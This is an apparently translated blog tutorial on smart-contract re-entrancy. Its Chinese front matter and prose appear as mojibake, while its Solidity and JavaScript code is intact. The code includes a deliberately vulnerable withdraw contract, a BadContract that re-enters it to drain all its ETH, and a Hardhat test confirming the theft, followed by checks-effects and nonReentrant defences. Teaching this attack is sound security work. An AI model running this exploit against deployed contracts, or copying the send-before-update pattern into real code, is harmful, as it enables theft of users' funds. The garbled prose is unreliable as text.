---
title: Web3ç³»åˆ—æ•™ç¨‹ä¹‹é«˜çº§ç¯‡---3ï¼šé‡å…¥ï¼ˆRe-Entrancyï¼‰æ”»å‡»
description: null
author: æŽç•™ç™½
weight: 0
date: 2022-08-02T14:19:32.313Z
lastmod: 2022-08-02T14:20:04.112Z
tags: []
categories:
  - åŒºå—é“¾
  - WEB3.0
featuredImage: https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/R3RYera.png
---

Re-Entrancyæ˜¯æ™ºèƒ½åˆçº¦ä¸­å‘çŽ°çš„æœ€å¤è€çš„å®‰å…¨æ¼æ´žä¹‹ä¸€ã€‚æ­£æ˜¯è¿™ä¸ªæ¼æ´žå¯¼è‡´äº†2016å¹´è‡­åæ˜­è‘—çš„ "DAOé»‘å®¢ "äº‹ä»¶ã€‚åœ¨è¿™æ¬¡é»‘å®¢æ”»å‡»ä¸­ï¼Œè¶…è¿‡360ä¸‡ETHè¢«ç›—ï¼Œå¦‚ä»Šä»·å€¼æ•°åäº¿ç¾Žå…ƒã€‚ðŸ¤¯

å½“æ—¶ï¼Œç”±äºŽä»¥å¤ªåŠç›¸å¯¹è¾ƒæ–°ï¼ŒDAOåŒ…å«äº†ç½‘ç»œä¸Šæ‰€æœ‰ä»¥å¤ªåŠçš„15%ã€‚è¿™æ¬¡å¤±è´¥å¯¹ä»¥å¤ªåŠç½‘ç»œäº§ç”Ÿäº†è´Ÿé¢å½±å“ï¼ŒVitalik Buterinæå‡ºäº†ä¸€ä¸ªè½¯ä»¶åˆ†å‰ï¼Œæ”»å‡»è€…å°†æ°¸è¿œæ— æ³•è½¬ç§»å‡ºä»–çš„ETHã€‚æœ‰äº›äººåŒæ„ï¼Œæœ‰äº›äººä¸åŒæ„ã€‚è¿™æ˜¯ä¸€ä¸ªæžå…·äº‰è®®æ€§çš„äº‹ä»¶ï¼Œè€Œä¸”è‡³ä»Šä»å……æ»¡äº‰è®®ã€‚

æœ€åŽï¼Œå®ƒå¯¼è‡´ä»¥å¤ªåŠè¢«åˆ†å‰æˆä¸¤ä¸ª--ä»¥å¤ªåŠç»å…¸ï¼Œä»¥åŠæˆ‘ä»¬ä»Šå¤©æ‰€çŸ¥çš„ä»¥å¤ªåŠã€‚ä»¥å¤ªåŠç»å…¸ç‰ˆçš„åŒºå—é“¾åœ¨åˆ†å‰ä¹‹å‰ä¸Žä»¥å¤ªåŠå®Œå…¨ç›¸åŒï¼Œä½†ä¹‹åŽçš„å‘å±•å°±åƒé»‘å®¢æ”»å‡»ç¡®å®žå‘ç”Ÿäº†ä¸€æ ·ï¼Œæ”»å‡»è€…ä»ç„¶æŽ§åˆ¶ç€è¢«ç›—èµ„é‡‘ã€‚ä»Šå¤©çš„ä»¥å¤ªåŠå®žæ–½äº†é»‘åå•ï¼Œå°±å¥½åƒé‚£æ¬¡æ”»å‡»ä»Žæœªå‘ç”Ÿè¿‡ä¸€æ ·ã€‚ðŸ¤”

è¿™æ˜¯é‚£ä¸ªæ•…äº‹çš„ç®€åŒ–ç‰ˆï¼Œæ•´ä¸ªè¿‡ç¨‹æ˜¯ç›¸å½“å¤æ‚çš„ã€‚æ¯ä¸ªäººéƒ½è¿›é€€ä¸¤éš¾ã€‚[ä½ å¯ä»¥åœ¨è¿™é‡Œé˜…è¯»æ›´å¤šå…³äºŽè¿™ä¸ªæ•…äº‹çš„å†…å®¹ï¼Œä»¥äº†è§£æ›´è¯¦ç»†çš„æƒ…å†µ](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/)

è®©æˆ‘ä»¬äº†è§£æ›´å¤šæœ‰å…³æ­¤æ”»å‡»çš„ä¿¡æ¯ï¼ðŸš€

## ä»€ä¹ˆæ˜¯ é‡å…¥æ”»å‡»?

![](https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/20220802215834.png)

Re-Entrancyæ˜¯ä¸€ä¸ªæ¼æ´žï¼Œå¦‚æžœåˆåŒAè°ƒç”¨åˆåŒBä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆåˆåŒBå¯ä»¥åœ¨åˆåŒAä»åœ¨å¤„ç†æ—¶å›žè°ƒåˆ°åˆåŒAã€‚

è¿™å¯èƒ½ä¼šå¯¼è‡´æ™ºèƒ½åˆçº¦çš„ä¸€äº›ä¸¥é‡æ¼æ´žï¼Œå¾€å¾€ä¼šäº§ç”Ÿä»Žåˆçº¦ä¸­æŠ½èµ°èµ„é‡‘çš„å¯èƒ½æ€§ã€‚

è®©æˆ‘ä»¬é€šè¿‡ä¸Šå›¾ä¸­æ‰€ç¤ºçš„ç¤ºä¾‹æ¥äº†è§£è¿™æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚å‡è®¾åˆçº¦Aæœ‰ä¸€ä¸ªå‡½æ•°ï¼Œç§°ä¹‹ä¸º`fï¼ˆï¼‰`ï¼Œå®ƒæœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼š

- æ£€æŸ¥åˆçº¦Bå­˜å…¥åˆçº¦Açš„ETHä½™é¢

- å°†ETHå‘é€å›žåˆçº¦B

- å°†åˆçº¦Bçš„ä½™é¢æ›´æ–°ä¸º0


ç”±äºŽETHå‘é€åŽä½™é¢ä¼šæ›´æ–°ï¼Œåˆçº¦Bå¯ä»¥åœ¨è¿™é‡Œåšä¸€äº›æ£˜æ‰‹çš„äº‹æƒ…ã€‚å¦‚æžœåˆçº¦Båœ¨å…¶åˆåŒä¸­åˆ›å»ºä¸€ä¸ª`fallbackï¼ˆï¼‰`æˆ–`receiveï¼ˆï¼‰`å‡½æ•°ï¼Œè¯¥å‡½æ•°åœ¨æ”¶åˆ°ETHæ—¶æ‰§è¡Œï¼Œé‚£ä¹ˆå®ƒå¯ä»¥å†æ¬¡è°ƒç”¨åˆçº¦aä¸­çš„`fï¼ˆï¼‰`ã€‚

ç”±äºŽåˆçº¦Aå½“æ—¶è¿˜æ²¡æœ‰å°†åˆçº¦Bçš„ä½™é¢æ›´æ–°ä¸º0ï¼Œå®ƒä¼šå†æ¬¡å°†ETHå‘é€ç»™åˆçº¦Bâ€”â€”è¿™å°±æ˜¯æ¼æ´žæ‰€åœ¨ï¼Œåˆçº¦Bå¯ä»¥æŒç»­è¿™æ ·åšï¼Œç›´åˆ°åˆçº¦Aå®Œå…¨è¶…å‡ºETHã€‚

## æž„å»º

æˆ‘ä»¬å°†åˆ›å»ºå‡ ä¸ªæ™ºèƒ½åˆçº¦ï¼Œ`GoodContract`å’Œ`BadContract`æ¥æ¼”ç¤ºè¿™ç§è¡Œä¸ºã€‚`BadContract`å°†èƒ½å¤Ÿä»Ž`GoodContract`ä¸­æŠ½å–æ‰€æœ‰çš„ETHã€‚

è®©æˆ‘ä»¬æž„å»ºä¸€ä¸ªç¤ºä¾‹ï¼Œè®©æ‚¨ä½“éªŒé‡å…¥æ”»å‡»æ˜¯å¦‚ä½•å‘ç”Ÿçš„ã€‚

- è¦è®¾ç½®ä¸€ä¸ªHardhaté¡¹ç›®ï¼Œè¯·æ‰“å¼€ç»ˆç«¯å¹¶æ‰§è¡Œè¿™äº›å‘½ä»¤

```bash
npm init --yes
npm install --save-dev hardhat
```

- å¦‚æžœä½ ä½¿ç”¨çš„æ˜¯Windowsç³»ç»Ÿï¼Œè¯·åšè¿™ä¸ªé¢å¤–çš„æ­¥éª¤ï¼ŒåŒæ—¶å®‰è£…è¿™äº›åº“ :)

```
npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
```

- åœ¨ä½ å®‰è£…Hardhatçš„åŒä¸€ç›®å½•ä¸‹è¿è¡Œã€‚

```bash
npx hardhat
```

- é€‰æ‹©`Create a basic sample project`
- å¯¹å·²æŒ‡å®šçš„`Hardhat Project root`æŒ‰å›žè½¦é”®
- å¦‚æžœä½ æƒ³æ·»åŠ ä¸€ä¸ª`.gitignore`ï¼Œè¯·æŒ‰å›žè½¦é”®ã€‚
- æŒ‰å›žè½¦é”®`Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?`

çŽ°åœ¨ä½ æœ‰ä¸€ä¸ªå‡†å¤‡å¥½çš„hardhaté¡¹ç›®äº†!

è®©æˆ‘ä»¬å…ˆåœ¨`contracts`ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œåä¸º`GoodContract.sol`ã€‚

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract GoodContract {

    mapping(address => uint) public balances;

    // Update the `balances` mapping to include the new ETH deposited by msg.sender
    function addBalance() public payable {
        balances[msg.sender] += msg.value;
    }

    // Send ETH worth `balances[msg.sender]` back to msg.sender
    function withdraw() public {
        require(balances[msg.sender] > 0);
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "Failed to send ether");
        // This code becomes unreachable because the contract's balance is drained
        // before user's balance could have been set to 0
        balances[msg.sender] = 0;
    }
}
```

è¯¥åˆçº¦éžå¸¸ç®€å•ã€‚ç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œ`addBalance`æ›´æ–°ä¸€ä¸ªæ˜ å°„ï¼Œä»¥åæ˜ å¦ä¸€ä¸ªåœ°å€å‘è¯¥åˆçº¦å­˜å…¥å¤šå°‘ETHã€‚ç¬¬äºŒä¸ªå‡½æ•°`withdraw`ï¼Œå…è®¸ç”¨æˆ·æå–ä»–ä»¬çš„ETHå›žæ¥ - ä½†ETHæ˜¯åœ¨æ›´æ–°ä½™é¢ä¹‹å‰å‘é€çš„ã€‚

çŽ°åœ¨è®©æˆ‘ä»¬åœ¨`contracts `ç›®å½•ä¸‹åˆ›å»ºå¦ä¸€ä¸ªæ–‡ä»¶ï¼Œç§°ä¸º`BadContract.sol`ã€‚

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./GoodContract.sol";

contract BadContract {
    GoodContract public goodContract;
    constructor(address _goodContractAddress) {
        goodContract = GoodContract(_goodContractAddress);
    }

    // Function to receive Ether
    receive() external payable {
        if(address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }

    // Starts the attack
    function attack() public payable {
        goodContract.addBalance{value: msg.value}();
        goodContract.withdraw();
    }
}
```

è¿™ä¸ªåˆçº¦è¦æœ‰è¶£å¾—å¤šï¼Œè®©æˆ‘ä»¬äº†è§£ä¸€ä¸‹æ˜¯æ€Žä¹ˆå›žäº‹ã€‚

åœ¨æž„é€ å‡½æ•°ä¸­ï¼Œè¯¥åˆçº¦è®¾ç½®äº†`GoodContract`çš„åœ°å€å¹¶åˆå§‹åŒ–äº†å®ƒçš„ä¸€ä¸ªå®žä¾‹ã€‚

`attack`å‡½æ•°æ˜¯ä¸€ä¸ª`payable`å‡½æ•°ï¼Œå®ƒä»Žæ”»å‡»è€…é‚£é‡ŒèŽ·å–ä¸€äº›ETHï¼Œå°†å…¶å­˜å…¥`GoodContract`ï¼Œç„¶åŽè°ƒç”¨`GoodContract`ä¸­çš„`withdraw`å‡½æ•°ã€‚

æ­¤æ—¶ï¼Œ`GoodContract`å°†çœ‹åˆ°`BadContract`çš„ä½™é¢å¤§äºŽ0ï¼Œæ‰€ä»¥å®ƒå°†å‘`BadContract`åå›žä¸€äº›ETHã€‚ç„¶è€Œï¼Œè¿™æ ·åšå°†è§¦å‘`BadContract`çš„`receive()`å‡½æ•°ã€‚

`receive()`å‡½æ•°å°†æ£€æŸ¥`GoodContrac`tæ˜¯å¦ä»æœ‰å¤§äºŽ0çš„ETHä½™é¢ï¼Œå¹¶å†æ¬¡è°ƒç”¨`GoodContract`ä¸­çš„`withdraw`å‡½æ•°ã€‚

è¿™å°†å½¢æˆä¸€ä¸ªå¾ªçŽ¯ï¼Œ`GoodContract`å°†ä¸æ–­å‘`BadContract`å‘é€èµ„é‡‘ï¼Œç›´åˆ°å®ƒçš„èµ„é‡‘å®Œå…¨è€—å°½ï¼Œç„¶åŽæœ€ç»ˆè¾¾åˆ°å°†`BadContract`çš„ä½™é¢æ›´æ–°ä¸º0å¹¶å®Œæˆäº¤æ˜“æ‰§è¡Œã€‚æ­¤æ—¶ï¼Œç”±äºŽé‡å…¥ï¼Œæ”»å‡»è€…å·²ç»æˆåŠŸåœ°ä»Ž`GoodContract`çªƒå–äº†æ‰€æœ‰çš„ETHã€‚

æˆ‘ä»¬å°†åˆ©ç”¨Hardhatæµ‹è¯•æ¥è¯æ˜Žè¿™ç§æ”»å‡»ç¡®å®žæœ‰æ•ˆï¼Œä»¥ç¡®ä¿`BadContract`ç¡®å®žåœ¨æ¶ˆè€—`GoodContract`çš„æ‰€æœ‰èµ„é‡‘ã€‚ä½ å¯ä»¥é˜…è¯»[Hardhat Docs for Testing](https://hardhat.org/tutorial/testing-contracts.html)ï¼Œä»¥ç†Ÿæ‚‰æµ‹è¯•çŽ¯å¢ƒã€‚

è®©æˆ‘ä»¬é¦–å…ˆåœ¨æµ‹è¯•æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º`attack.js`çš„æ–‡ä»¶ï¼Œå¹¶åœ¨é‚£é‡Œæ·»åŠ ä»¥ä¸‹ä»£ç ã€‚

```js
const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { parseEther } = require("ethers/lib/utils");
const { ethers } = require("hardhat");

describe("Attack", function () {
  it("Should empty the balance of the good contract", async function () {
    // Deploy the good contract
    const goodContractFactory = await ethers.getContractFactory("GoodContract");
    const goodContract = await goodContractFactory.deploy();
    await goodContract.deployed();

    //Deploy the bad contract
    const badContractFactory = await ethers.getContractFactory("BadContract");
    const badContract = await badContractFactory.deploy(goodContract.address);
    await badContract.deployed();

    // Get two addresses, treat one as innocent user and one as attacker
    const [_, innocentAddress, attackerAddress] = await ethers.getSigners();

    // Innocent User deposits 10 ETH into GoodContract
    let tx = await goodContract.connect(innocentAddress).addBalance({
      value: parseEther("10"),
    });
    await tx.wait();

    // Check that at this point the GoodContract's balance is 10 ETH
    let balanceETH = await ethers.provider.getBalance(goodContract.address);
    expect(balanceETH).to.equal(parseEther("10"));

    // Attacker calls the `attack` function on BadContract
    // and sends 1 ETH
    tx = await badContract.connect(attackerAddress).attack({
      value: parseEther("1"),
    });
    await tx.wait();

    // Balance of the GoodContract's address is now zero
    balanceETH = await ethers.provider.getBalance(goodContract.address);
    expect(balanceETH).to.equal(BigNumber.from("0"));

    // Balance of BadContract is now 11 ETH (10 ETH stolen + 1 ETH from attacker)
    balanceETH = await ethers.provider.getBalance(badContract.address);
    expect(balanceETH).to.equal(parseEther("11"));
  });
});
```

åœ¨è¿™é¡¹æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆéƒ¨ç½²äº†`GoodContract`å’Œ`BadContract`ã€‚

ç„¶åŽæˆ‘ä»¬ä»ŽHardhatèŽ·å¾—ä¸¤ä¸ªç­¾åè€…--æµ‹è¯•è´¦æˆ·è®©æˆ‘ä»¬è®¿é—®10ä¸ªè´¦æˆ·ï¼Œè¿™äº›è´¦æˆ·éƒ½æ˜¯é¢„å…ˆç”¨ETHèµ„åŠ©çš„ã€‚æˆ‘ä»¬å°†å…¶ä¸­ä¸€ä¸ªä½œä¸ºæ— è¾œçš„ç”¨æˆ·ï¼Œå¦ä¸€ä¸ªä½œä¸ºæ”»å‡»è€…ã€‚

æˆ‘ä»¬è®©æ— è¾œçš„ç”¨æˆ·å‘é€10ä¸ªETHåˆ°`GoodContract`ã€‚ç„¶åŽï¼Œæ”»å‡»è€…é€šè¿‡å¯¹`BadContract`è°ƒç”¨`attack()`å¹¶å‘å…¶å‘é€1ä¸ªETHå¼€å§‹æ”»å‡»ã€‚

æœ€åŽæ‰§è¡Œæµ‹è¯•ï¼Œåœ¨ä½ çš„ç»ˆç«¯è¾“å…¥ã€‚

```
npx hardhat test
```

å¦‚æžœä½ çš„æ‰€æœ‰æµ‹è¯•éƒ½é€šè¿‡äº†ï¼Œé‚£ä¹ˆæ”»å‡»å°±æˆåŠŸäº†

## é¢„é˜²

æœ‰ä¸¤ä»¶äº‹ä½ å¯ä»¥åšã€‚

æˆ–è€…ï¼Œä½ å¯ä»¥è®¤è¯†åˆ°è¿™ä¸ªå‡½æ•°å®¹æ˜“å—åˆ°é‡å…¥çš„å½±å“ï¼Œå¹¶ç¡®ä¿ä½ åœ¨å®žé™…å‘ç”¨æˆ·å‘é€ETHä¹‹å‰ï¼Œåœ¨`withdraw`å‡½æ•°ä¸­æ›´æ–°ç”¨æˆ·çš„ä½™é¢ï¼Œæ‰€ä»¥å¦‚æžœä»–ä»¬è¯•å›¾å›žè°ƒåˆ°`withdraw`ï¼Œå°±ä¼šå¤±è´¥ã€‚

å¦å¤–ï¼Œ`OpenZeppelin`æœ‰ä¸€ä¸ª`ReentrancyGuard`åº“ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªåä¸º`nonReentrant`çš„ä¿®æ”¹å™¨ï¼Œåœ¨ä½ åº”ç”¨å®ƒçš„å‡½æ•°ä¸­é˜»æ­¢é‡å…¥ã€‚å®ƒçš„å·¥ä½œåŽŸç†åŸºæœ¬å¦‚ä¸‹ã€‚

```solidity
modifier nonReentrant() {
    require(!locked, "No re-entrancy");
    locked = true;
    _;
    locked = false;
}
```

å¦‚æžœä½ åœ¨`withdraw`å‡½æ•°ä¸Šåº”ç”¨è¿™ä¸€ç‚¹ï¼Œé‚£ä¹ˆå›žè°ƒåˆ°`withdraw`çš„è¿‡ç¨‹å°†ä¼šå¤±è´¥ï¼Œå› ä¸ºåœ¨ç¬¬ä¸€ä¸ª`withdraw`å‡½æ•°æ‰§è¡Œå®Œæ¯•ä¹‹å‰ï¼Œ`locked`å°†ç­‰äºŽ`true`ï¼Œä»Žè€Œä¹Ÿé˜»æ­¢äº†é‡å…¥ã€‚

## é˜…è¯»

è¿™äº›æ˜¯å¯é€‰çš„ï¼Œä½†å»ºè®®é˜…è¯»çš„å†…å®¹

- [DAO Hack](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/)
- [Reentrancy Guard Library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol)
- [Hardhat Testing](https://hardhat.org/tutorial/testing-contracts.html)

> åŽŸæ–‡ï¼š[https://www.learnweb3.io/tracks/senior/re-entrancy](https://www.learnweb3.io/tracks/senior/re-entrancy)

![](https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/my.png)